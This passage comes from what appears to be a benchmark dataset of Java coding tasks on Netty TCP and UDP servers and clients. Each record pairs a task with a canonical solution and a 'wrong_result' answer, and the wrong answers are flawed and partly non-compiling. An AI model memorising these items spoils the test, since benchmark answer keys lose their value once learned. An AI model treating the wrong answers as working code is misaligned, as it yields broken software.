Files.createTempFile(\"flvdata\", \".tmp\");\n            this.dataChannel = FileChannel.open(tempPath, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void createOutputFile() {\n        try {\n            this.fileChannel = FileChannel.open(Paths.get(filePath), StandardOpenOption.CREATE, StandardOpenOption.WRITE);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean writeTag(ITag tag) {\n        try {\n            ByteBuffer bb = tag.getByteBuffer();\n            dataChannel.write(bb);\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public void close() {\n        finalizeFlv();\n        try {\n            if (fileChannel != null) fileChannel.close();\n            if (dataChannel != null) dataChannel.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private long finalizeFlv() {\n        if (!append) {\n            try {\n                byte[] header = {0x46, 0x4C, 0x56};\n                fileChannel.write(ByteBuffer.wrap(header));\n                ByteBuffer sizeBuf = ByteBuffer.allocate(4);\n                sizeBuf.putInt(0);\n                fileChannel.write(sizeBuf);\n                FileChannel data = this.dataChannel;\n                FileChannel out = this.fileChannel;\n                data.position(0);\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = data.read(ByteBuffer.wrap(buffer))) > 0) {\n                    out.write(ByteBuffer.wrap(buffer, 0, bytesRead));\n                }\n                long fileSize = out.size();\n                sizeBuf.rewind();\n                sizeBuf.putInt((int) (fileSize - 9));\n                fileChannel.position(4);\n                fileChannel.write(sizeBuf);\n                return fileSize;\n            } catch (IOException e) {\n                e.printStackTrace();\n                return -1;\n            }\n        } else {\n            try {\n                fileChannel.position(appendOffset);\n                FileChannel data = this.dataChannel;\n                FileChannel out = this.fileChannel;\n                data.position(0);\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = data.read(ByteBuffer.wrap(buffer))) > 0) {\n                    out.write(ByteBuffer.wrap(buffer, 0, bytesRead));\n                }\n                return out.size();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return -1;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data (discarding it in this example). It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> void - Entry point that configures and starts the Netty server\n  - args: [String[]] - Command line arguments (not directly used)\n  - Throws: Exception - For various Netty and SSL related exceptions\n- initChannel: [initChannel(SocketChannel ch)] -> void - Initializes the channel pipeline for each new connection (inner method of ChannelInitializer)\n  - ch: [SocketChannel] - The socket channel being initialized\n  - Configures SSL handler (if enabled) and adds the main server handler to the pipeline",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class DiscardServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class DiscardServer {\n    private boolean SSL;\n    private int PORT;\n    private SslContext sslCtx;\n\n    public static void main(String[] args) throws Exception {\n        DiscardServer server = new DiscardServer();\n        server.PORT = 7891;\n        server.SSL = false;\n        server.start();\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (SSL) {\n                         p.addLast(sslCtx.newHandler(ch));\n                     }\n                     p.addLast(new DiscardHandler());\n                 }\n             })\n             .childOption(ChannelOption.TCP_NODELAY, true)\n             .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            if (SSL) {\n                sslCtx = SslContext.newServerContext(\n                    new SslContextBuilder()\n                        .protocols(\"TLSv1.2\")\n                        .keyManager(new File(\"server.key\"), new File(\"server.crt\"))\n                        .trustManager(new File(\"server.crt\"))\n                        .build()\n                );\n            } else {\n                sslCtx = null;\n            }\n\n            ChannelFuture future = b.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private static class DiscardHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            // Discard the message\n        }\n    }\n}"
  },
  {
    "Task_id": 231,
    "Instruction": "Task Description: Create a Java class that implements a fake Docker server using Netty TCP server technology to intercept and record HTTP requests while responding with empty JSON responses.\n\nClass Description: The FakeDockerServer class simulates a Docker API server for testing purposes. It captures incoming HTTP requests and responds with a static JSON response. The server uses Netty's NIO event loop groups for handling connections and implements graceful shutdown capabilities.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- parent: NioEventLoopGroup - The parent event loop group for accepting connections\n- child: NioEventLoopGroup - The child event loop group for handling connections\n- requests: List<HttpRequest> - Stores all received HTTP requests for inspection\n- channel: Channel - The server's communication channel\n\nMethods:\n- FakeDockerServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> void - Starts the server and configures request handling pipeline\n- stop() -> void - Stops the server and releases resources gracefully\n- getRequests() -> List<HttpRequest> - Returns the list of captured HTTP requests",
    "Canonical_solution": "import com.github.dockerjava.api.DockerClient;\nimport com.github.dockerjava.core.DefaultDockerClientConfig;\nimport com.github.dockerjava.core.DockerClientBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_LENGTH;\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_TYPE;\nimport static io.netty.handler.codec.http.HttpResponseStatus.OK;\nimport static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;\n\npublic class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests = new ArrayList<>();\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(parent, child)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel socketChannel) throws Exception {\n                    ChannelPipeline pipeline = socketChannel.pipeline();\n                    pipeline.addLast(\"codec\", new HttpServerCodec());\n                    pipeline.addLast(\"httpHandler\", new SimpleChannelInboundHandler<Object>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext context, Object message) throws Exception {\n                            if (message instanceof HttpRequest) {\n                                HttpRequest request = (HttpRequest) message;\n                                requests.add(request);\n                            }\n\n                            if (message instanceof HttpContent) {\n                                FullHttpResponse response = new DefaultFullHttpResponse(HTTP_1_1, OK, Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8));\n                                response.headers().set(CONTENT_TYPE, \"application/json; charset=UTF-8\");\n                                response.headers().set(CONTENT_LENGTH, response.content().readableBytes());\n                                context.writeAndFlush(response);\n                            }\n                        }\n                    });\n                }\n            });\n\n        channel = bootstrap.bind(port).syncUninterruptibly().channel();\n    }\n\n    public void stop() throws Exception {\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n        channel.closeFuture().sync();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests;\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n        this.requests = new ArrayList<>();\n    }\n\n    public void start() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(parent, child)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new HttpServerCodec());\n                 p.addLast(new RequestHandler());\n             }\n         })\n         .bind(port).sync();\n        this.channel = b.channel();\n    }\n\n    public void stop() {\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n\n    private class RequestHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                requests.add(request);\n                FullHttpResponse response = new FullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n                response.content().writeBytes(\"{}\".getBytes(StandardCharsets.UTF_8));\n                ctx.write(response);\n                ctx.flush();\n                ctx.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework for backup communication in a distributed system. The server should handle incoming UDP packets, decode them, and process messages while managing resources efficiently.\n\nClass Description: BackupServer is an AutoCloseable class that establishes a Netty-based UDP server for backup communication. It manages network connections, message handling, and graceful shutdown procedures.\n\nAttributes:\n- commonParameter: [CommonParameter] - Configuration parameters for the backup server\n- port: [int] - Port number to bind the UDP server\n- backupManager: [BackupManager] - Manager for backup operations\n- channel: [Channel] - Netty channel for UDP communication\n- shutdown: [boolean] - Flag indicating server shutdown status\n- executor: [ExecutorService] - Thread executor for server operations\n\nMethods:\n- initServer(): [void]() -> [void] - Initializes and starts the backup server in a separate thread if conditions are met\n- start(): [void]() throws [Exception] - Configures and starts the Netty UDP server with proper handlers\n- close(): [void]() -> [void] - Implements AutoCloseable to gracefully shutdown the server and release resources\n\nConstructor:\n- BackupServer([BackupManager backupManager]) - Creates a new instance with the specified BackupManager",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32FrameDecoder;\nimport io.netty.handler.codec.protobuf.ProtobufVarint32LengthFieldPrepender;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.TimeUnit;\nimport org.tron.common.backup.BackupManager;\nimport org.tron.common.es.ExecutorServiceManager;\nimport org.tron.common.parameter.CommonParameter;\nimport org.tron.p2p.stats.TrafficStats;\n\npublic class BackupServer implements AutoCloseable {\n\n  private CommonParameter commonParameter = CommonParameter.getInstance();\n  private int port = commonParameter.getBackupPort();\n  private BackupManager backupManager;\n  private Channel channel;\n  private volatile boolean shutdown = false;\n  private ExecutorService executor;\n\n  public BackupServer(final BackupManager backupManager) {\n    this.backupManager = backupManager;\n  }\n\n  public void initServer() {\n    if (port > 0 && commonParameter.getBackupMembers().size() > 0) {\n      executor = ExecutorServiceManager.newSingleThreadExecutor(\"BackupServer\");\n      executor.submit(() -> {\n        try {\n          start();\n        } catch (Exception e) {\n          logger.error(\"Start backup server failed, {}\", e);\n        }\n      });\n    }\n  }\n\n  private void start() throws Exception {\n    NioEventLoopGroup group = new NioEventLoopGroup(1);\n    try {\n      while (!shutdown) {\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n            .channel(NioDatagramChannel.class)\n            .handler(new ChannelInitializer<NioDatagramChannel>() {\n              @Override\n              public void initChannel(NioDatagramChannel ch) throws Exception {\n                ch.pipeline().addLast(TrafficStats.udp);\n                ch.pipeline().addLast(new ProtobufVarint32LengthFieldPrepender());\n                ch.pipeline().addLast(new ProtobufVarint32FrameDecoder());\n                ch.pipeline().addLast(new PacketDecoder());\n                MessageHandler messageHandler = new MessageHandler(ch, backupManager);\n                backupManager.setMessageHandler(messageHandler);\n                ch.pipeline().addLast(messageHandler);\n              }\n            });\n\n        channel = b.bind(port).sync().channel();\n        channel.closeFuture().sync();\n        if (shutdown) {\n          break;\n        }\n      }\n    } finally {\n      group.shutdownGracefully().sync();\n    }\n  }\n\n  @Override\n  public void close() {\n    shutdown = true;\n    backupManager.stop();\n    if (channel != null) {\n      try {\n        channel.close().await(10, TimeUnit.SECONDS);\n      } catch (Exception e) {\n        logger.warn(\"Closing backup server failed.\", e);\n      }\n    }\n    ExecutorServiceManager.shutdownAndAwaitTermination(executor, \"BackupServer\");\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "public class BackupServer implements AutoCloseable {\n    private final CommonParameter commonParameter;\n    private final int port;\n    private final BackupManager backupManager;\n    private Channel channel;\n    private boolean shutdown;\n    private ExecutorService executor;\n\n    public BackupServer(BackupManager backupManager) {\n        this.backupManager = backupManager;\n        this.commonParameter = new CommonParameter(); // Assuming CommonParameter is initialized here\n    }\n\n    public void initServer() {\n        if (!shutdown) {\n            new Thread(() -> {\n                try {\n                    start();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                 .channel(NioDatagramChannel.class)\n                 .option(ChannelOption.SO_BROADCAST, true)\n                 .handler(new ChannelInitializer<Channel>() {\n                     @Override\n                     protected void initChannel(Channel ch) throws Exception {\n                         ch.pipeline().addLast(new InnerHandler());\n                     }\n                 });\n        channel = bootstrap.bind(port).sync().channel();\n\n        executor = Executors.newFixedThreadPool(4);\n    }\n\n    private class InnerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof ByteBuf) {\n                ByteBuf buf = (ByteBuf) msg;\n                byte[] data = new byte[buf.readableBytes()];\n                buf.readBytes(data);\n                executor.submit(() -> backupManager.processMessage(data));\n                buf.release();\n            }\n        }\n    }\n\n    @Override\n    public void close() {\n        if (!shutdown) {\n            shutdown = true;\n            channel.closeFuture().awaitUninterruptibly();\n            executor.shutdownNow();\n        }\n    }\n}"
  },
  {
    "Task_id": 235,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework, with support for multiple transport types (NIO, Epoll, KQueue, IOUring) and graceful shutdown capabilities.\n\nClass Description: GeyserServer is a Netty-based UDP server implementation that handles network communication using the most optimal transport available on the system. It manages server lifecycle including binding to ports and graceful shutdown.\n\nAttributes:\n- TRANSPORT: [Transport] - Static final field holding the best available transport type\n- SHUTDOWN_QUIET_PERIOD_MS: [int] - Milliseconds to wait for quiet period during shutdown\n- SHUTDOWN_TIMEOUT_MS: [int] - Maximum milliseconds to wait for shutdown\n- geyser: [GeyserImpl] - Reference to the main Geyser implementation\n- group: [EventLoopGroup] - Parent event loop group for the server\n- childGroup: [EventLoopGroup] - Child event loop group for handling connections\n- bootstrap: [ServerBootstrap] - Netty server bootstrap instance\n- playerGroup: [EventLoopGroup] - Event loop group for player connections\n- bootstrapFutures: [ChannelFuture[]] - Array of channel futures for server binding\n\nMethods:\n- GeyserServer([GeyserImpl geyser, int threadCount]) -> [void] - Constructor that initializes the server with specified thread count\n- bind([InetSocketAddress address]) -> [CompletableFuture<Void>] - Binds the server to the specified address and returns a future\n- shutdown() -> [void] - Gracefully shuts down the server and releases all resources\n- createBootstrap() -> [ServerBootstrap] - Private method that creates and configures the server bootstrap\n- compatibleTransport() -> [Transport] - Static private method that detects the best available transport\n- isClassAvailable([String className]) -> [boolean] - Static private helper method to check class availability\n\nNested Types:\n- Transport: [record] - Holds transport-specific channel class and event loop group factory",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollDatagramChannel;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueue;\nimport io.netty.channel.kqueue.KQueueDatagramChannel;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DatagramChannel;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUring;\nimport io.netty.incubator.channel.uring.IOUringDatagramChannel;\nimport io.netty.incubator.channel.uring.IOUringEventLoopGroup;\nimport io.netty.util.concurrent.Future;\nimport org.cloudburstmc.netty.channel.raknet.RakChannelFactory;\nimport org.cloudburstmc.netty.channel.raknet.config.RakChannelOption;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.IntFunction;\n\npublic final class GeyserServer {\n    private static final Transport TRANSPORT = compatibleTransport();\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 100;\n    private static final int SHUTDOWN_TIMEOUT_MS = 500;\n\n    private final GeyserImpl geyser;\n    private EventLoopGroup group;\n    private EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private EventLoopGroup playerGroup;\n    private ChannelFuture[] bootstrapFutures;\n\n    public GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = TRANSPORT.eventLoopGroupFactory().apply(1);\n        this.childGroup = TRANSPORT.eventLoopGroupFactory().apply(threadCount);\n        this.bootstrap = this.createBootstrap();\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures = new ChannelFuture[1];\n        ChannelFuture future = bootstrap.bind(address);\n        bootstrapFutures[0] = future;\n        return Bootstraps.allOf(bootstrapFutures);\n    }\n\n    public void shutdown() {\n        try {\n            Future<?> futureChildGroup = this.childGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.childGroup = null;\n            Future<?> futureGroup = this.group.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.group = null;\n            Future<?> futurePlayerGroup = this.playerGroup.shutdownGracefully(SHUTDOWN_QUIET_PERIOD_MS, SHUTDOWN_TIMEOUT_MS, TimeUnit.MILLISECONDS);\n            this.playerGroup = null;\n\n            futureChildGroup.sync();\n            futureGroup.sync();\n            futurePlayerGroup.sync();\n        } catch (InterruptedException e) {\n            GeyserImpl.getInstance().getLogger().severe(\"Exception in shutdown process\", e);\n        }\n        for (ChannelFuture f : bootstrapFutures) {\n            f.channel().closeFuture().syncUninterruptibly();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        GeyserServerInitializer serverInitializer = new GeyserServerInitializer(this.geyser);\n        playerGroup = serverInitializer.getEventLoopGroup();\n\n        return new ServerBootstrap()\n                .channelFactory(RakChannelFactory.server(TRANSPORT.datagramChannel()))\n                .group(group, childGroup)\n                .childHandler(serverInitializer);\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.incubator.channel.uring.IOUring\")\n                && IOUring.isAvailable()\n                && Boolean.parseBoolean(System.getProperty(\"Geyser.io_uring\"))) {\n            return new Transport(IOUringDatagramChannel.class, IOUringEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.epoll.Epoll\") && Epoll.isAvailable()) {\n            return new Transport(EpollDatagramChannel.class, EpollEventLoopGroup::new);\n        }\n\n        if (isClassAvailable(\"io.netty.channel.kqueue.KQueue\") && KQueue.isAvailable()) {\n            return new Transport(KQueueDatagramChannel.class, KQueueEventLoopGroup::new);\n        }\n\n        return new Transport(NioDatagramChannel.class, NioEventLoopGroup::new);\n    }\n\n    private record Transport(Class<? extends DatagramChannel> datagramChannel, IntFunction<EventLoopGroup> eventLoopGroupFactory) {\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 5,
    "wrong_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.kqueue.KQueueEventLoopGroup;\nimport io.netty.channel.utils.IOUringEventLoopGroup;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Function;\n\npublic class GeyserServer {\n    public record Transport(Class<? extends Channel> channelClass, Function<Integer, EventLoopGroup> eventLoopGroupFactory) {}\n    private static final int SHUTDOWN_QUIET_PERIOD_MS = 5000;\n    private static final int SHUTDOWN_TIMEOUT_MS = 30000;\n    private final GeyserImpl geyser;\n    private final EventLoopGroup group;\n    private final EventLoopGroup childGroup;\n    private final ServerBootstrap bootstrap;\n    private final EventLoopGroup playerGroup;\n    private final ChannelFuture[] bootstrapFutures;\n    private static final Transport TRANSPORT = compatibleTransport();\n\n    private GeyserServer(GeyserImpl geyser, int threadCount) {\n        this.geyser = geyser;\n        this.group = new EventLoopGroup(1, new io.netty.util.concurrent.ThreadPerTaskExecutor());\n        this.childGroup = new EventLoopGroup(threadCount);\n        this.playerGroup = new EventLoopGroup(threadCount);\n        this.bootstrap = createBootstrap();\n        this.bootstrapFutures = new ChannelFuture[1];\n    }\n\n    public CompletableFuture<Void> bind(InetSocketAddress address) {\n        bootstrapFutures[0] = bootstrap.bind(address);\n        return CompletableFuture.completedFuture(bootstrapFutures[0].sync());\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n        childGroup.shutdownGracefully();\n        playerGroup.shutdownGracefully();\n        try {\n            if (bootstrapFutures[0] != null) {\n                bootstrapFutures[0].channel().close();\n            }\n            Thread.sleep(SHUTDOWN_QUIET_PERIOD_MS);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    private ServerBootstrap createBootstrap() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(group, childGroup)\n                 .childHandler(new ChannelHandler() {})\n                 .option(ChannelOption.SO_REUSEADDR, true)\n                 .childOption(ChannelOption.SO_REUSEADDR, true);\n        return bootstrap;\n    }\n\n    private static Transport compatibleTransport() {\n        if (isClassAvailable(\"io.netty.channel.epoll.EpollEventLoopGroup\")) {\n            return new Transport(EpollEventLoopGroup.class, (threadCount) -> new EpollEventLoopGroup(threadCount));\n        } else if (isClassAvailable(\"io.netty.channel.kqueue.KQueueEventLoopGroup\")) {\n            return new Transport(KQueueEventLoopGroup.class, (threadCount) -> new KQueueEventLoopGroup(threadCount));\n        } else if (isClassAvailable(\"io.netty.channel.io.uring.IOUringEventLoopGroup\")) {\n            return new Transport(IOUringEventLoopGroup.class, (threadCount) -> new IOUringEventLoopGroup(threadCount));\n        } else {\n            return new Transport(NioEventLoopGroup.class, (threadCount) -> new NioEventLoopGroup(threadCount));\n        }\n    }\n\n    private static boolean isClassAvailable(String className) {\n        try {\n            Class.forName(className);\n            return true;\n        } catch (ClassNotFoundException e) {\n            return false;\n        }\n    }\n\n    public static class GeyserImpl {}\n}\n```"
  },
  {
    "Task_id": 236,
    "Instruction": "Task Description: Create a Java class that implements a UDP client using Netty framework for sending and receiving datagram packets. The client should be able to start a connection, send messages to a specified host and port, handle console input for sending messages, and gracefully shutdown the connection.\n\nClass Description: DatagramChannelEchoClient is a Netty-based UDP client that establishes a connection to a specified host and port, sends messages via UDP datagrams, and can be controlled through console input. It manages network resources efficiently and provides clean shutdown capabilities.\n\nAttributes:\n- host: String - The target host address to which messages will be sent\n- port: int - The target port number on the host\n- group: EventLoopGroup - Netty event loop group for handling I/O operations\n- channel: Channel - The Netty channel used for UDP communication\n\nMethods:\n- DatagramChannelEchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Starts the UDP client by initializing Netty components and binding to the port\n- sendMessage(String message) -> void - Sends a message to the configured host and port via UDP\n- stop() -> void - Gracefully shuts down the client and releases resources\n- runConsoleInput() -> void - Reads input from console and sends it as messages until terminated",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioDatagramChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\n\npublic final class DatagramChannelEchoClient {\n\n    private final String host;\n    private final int port;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public DatagramChannelEchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioDatagramChannel.class)\n         .option(ChannelOption.SO_BROADCAST, true)\n         .handler(new DatagramChannelEchoClientHandler());\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n        System.out.println(\"DatagramChannelEchoClient\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        io.netty.buffer.ByteBuf buf = io.netty.buffer.Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(new io.netty.channel.socket.DatagramPacket(\n            buf, new InetSocketAddress(host, port)));\n        writeBuffer.clear();\n    }\n\n    public void stop() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n\n    public void runConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + host);\n            System.exit(1);\n        } catch (IOException e) {\n            